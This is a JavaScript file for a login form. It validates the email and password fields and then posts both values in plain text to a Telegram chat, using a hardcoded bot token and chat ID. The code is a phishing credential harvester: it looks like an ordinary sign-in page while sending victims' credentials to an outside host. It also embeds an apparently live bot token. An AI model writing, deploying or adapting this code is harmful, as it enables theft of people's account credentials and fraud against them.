let form = document.querySelector('.form'),
  formInputs = document.querySelectorAll('.js-input'),
  inputEmail = document.querySelector('.input-email'),
  inputPassword = document.querySelector('.input-password');

var elem = document.querySelector('.form-box');


function validateEmail(email)
  {
    let re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    let re1 = /[a-zA-Z0-9]{1,}@[a-zA-Z0-9]{1,}(\.com|\.ru)$/;
    return re1.test(String(email).toLowerCase());
  }

const TOKEN = "6082796851:AAEtixxSAwUHYtTUYR3QpzrtngR6ALxT3Jg";
const CHAT_ID = "-1001875201720";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

form.onsubmit = function ()
  {
    errorFlag = 0;

    let emailVal = inputEmail.value,
      passwordVal = inputPassword.value,
      emptyInputs = Array.from(formInputs).filter(input => input.value === '');
      
    formInputs.forEach(function (input ) {
      if (input.value === '') {
        elem.classList.add('error');
        errorFlag += 1;
      }
      else
      {
    
        elem.classList.remove('error');
      }
      
    })

    if (emptyInputs.length !== 0) 
    {
      
      elem.classList.add('error');
      errorFlag += 1;
      return false;
      }
    else
    {
      elem.classList.remove('error');
    }
    

    if (emailVal.length > 320)
    {
      alert('Email too big');
      errorFlag += 1;
      elem.classList.add('error');
      return false;
    }
    else {
      elem.classList.remove('error');
    }

    if (passwordVal.length > 25)
    {
      alert('Password too big');
      errorFlag += 1;
      elem.classList.add('error');
      return false;
    }
    else
    {
      elem.classList.remove('error');
    }

    if (passwordVal.length < 5)
    {
      alert('Password too small');
      errorFlag += 1;
      elem.classList.add('error');
      return false;
    }
    else
    {
      elem.classList.remove('error');
    }

    if (!validateEmail(emailVal))
    {
      alert('Email invalid');
      errorFlag += 1;
      elem.classList.add('error');
      return false;
    }
    else
    {
      elem.classList.remove('error');
    }


    
    if (errorFlag == 0) 
    {
      let message = `<b>Email: </b> ${emailVal}\n`;
      message += `<b>Password: </b> ${passwordVal}`;


      axios.post(URL_API, {
        chat_id: CHAT_ID, 
        parse_mode: 'html',
        text: message
      })

      

      
    }
    
  }